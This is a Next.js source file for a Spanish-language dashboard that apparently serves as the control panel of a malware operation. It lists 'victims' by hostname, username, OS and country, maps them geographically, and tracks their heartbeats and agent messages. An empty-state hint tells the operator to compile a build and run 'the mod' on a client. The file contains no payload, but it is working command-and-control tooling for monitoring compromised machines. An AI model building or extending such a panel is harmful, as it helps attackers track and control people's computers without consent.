'use client';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useApi } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import { Counters } from '@/components/counters';
import { WorldMap } from '@/components/world-map';
import { EventFeed } from '@/components/event-feed';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Empty, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { Topbar } from '@/components/topbar';
import type { Dashboard, Victim } from '@/lib/types';
import { ago, flag, osTone } from '@/lib/format';

export default function DashboardPage() {
  const router = useRouter();
  const dashboard = useApi<Dashboard>('/dashboard', { pollMs: 10_000 });
  const recent = useApi<{ items: Victim[] }>('/victims?limit=8', { pollMs: 10_000 });
  const { events } = useLiveContext();

  return (
    <>
      <Topbar title="Resumen" subtitle={`${events.length} eventos en vivo en esta sesión`} />
      <div className="space-y-3 pt-3">
        <Counters data={dashboard.data} loading={dashboard.loading} />

        <div className="grid grid-cols-1 gap-3 xl:grid-cols-[1fr_360px]">
          <Card className="overflow-hidden">
            <CardHeader>
              <CardTitle>Geolocalización</CardTitle>
              <span className="font-mono text-2xs text-muted">heartbeat · refresco 20 s</span>
            </CardHeader>
            <WorldMap className="min-h-[300px]" onSelect={(point) => router.push(`/victims?select=${point.id}`)} />
          </Card>

          <div className="flex flex-col gap-3">
            <Card>
              <CardHeader><CardTitle>Sistemas</CardTitle></CardHeader>
              <CardContent className="space-y-2">
                {(dashboard.data?.byOs ?? []).length === 0 ? <p className="text-xs text-muted">Sin datos</p> : null}
                {(dashboard.data?.byOs ?? []).map((row) => {
                  const total = dashboard.data?.counters.total || 1;
                  return (
                    <div key={row.os}>
                      <div className="mb-1 flex justify-between text-2xs"><span className={osTone(row.os)}>{row.os}</span><span className="num text-muted">{row.count}</span></div>
                      <div className="h-1 rounded bg-line"><div className="h-1 rounded bg-brand" style={{ width: `${(row.count / total) * 100}%` }} /></div>
                    </div>
                  );
                })}
              </CardContent>
            </Card>
            <Card className="flex-1">
              <CardHeader><CardTitle>Países</CardTitle></CardHeader>
              <CardContent className="space-y-1">
                {(dashboard.data?.byCountry ?? []).map((row) => (
                  <div key={row.country} className="flex justify-between text-xs">
                    <span>{flag(row.country === 'unknown' ? null : row.country)} {row.country}</span>
                    <span className="num text-muted">{row.count}</span>
                  </div>
                ))}
              </CardContent>
            </Card>
          </div>
        </div>

        <div className="grid grid-cols-1 gap-3 xl:grid-cols-[1fr_360px]">
          <Card>
            <CardHeader>
              <CardTitle>Equipos recientes</CardTitle>
              <Link href="/victims" className="text-2xs text-brand">todos los equipos →</Link>
            </CardHeader>
            {recent.loading ? <SkeletonRows rows={6} cols={6} /> : (recent.data?.items ?? []).length === 0 ? <Empty title="Sin equipos todavía" hint="Compila un build con su config y ejecuta el mod en un cliente." /> : (
              <Table className="max-lg:min-w-0">
                <THead><TR><TH data-col="host">Equipo</TH><TH data-col="os">SO</TH><TH data-col="country">País</TH><TH data-col="user">Usuario</TH><TH data-col="tags">Etiquetas</TH><TH data-col="seen">Última señal</TH></TR></THead>
                <tbody>
                  {recent.data!.items.map((victim) => (
                    <TR key={victim.id} onClick={() => router.push(`/victims?select=${victim.id}`)} className="cursor-pointer">
                      <TD data-col="host" className="font-mono text-xs text-ink">{victim.hostname}</TD>
                      <TD data-col="os"><Badge tone={victim.online ? 'ok' : 'default'}>{victim.online ? 'online' : victim.os}</Badge></TD>
                      <TD data-col="country" className="text-muted">{flag(victim.countryCode)} {victim.country ?? '—'}</TD>
                      <TD data-col="user" className="font-mono text-muted">{victim.username}</TD>
                      <TD data-col="tags" className="space-x-1">{victim.tags.slice(0, 3).map((tag) => <Badge key={tag}>{tag}</Badge>)}</TD>
                      <TD data-col="seen" className={victim.online ? 'num text-ok' : 'num text-muted'}>{ago(victim.online ? victim.lastAgentMessageAt ?? victim.lastHeartbeatAt : victim.lastHeartbeatAt)}</TD>
                    </TR>
                  ))}
                </tbody>
              </Table>
            )}
          </Card>
          <Card>
            <CardHeader><CardTitle>Actividad en vivo</CardTitle></CardHeader>
            <div className="max-h-[420px] overflow-y-auto"><EventFeed /></div>
          </Card>
        </div>
      </div>
    </>
  );
}
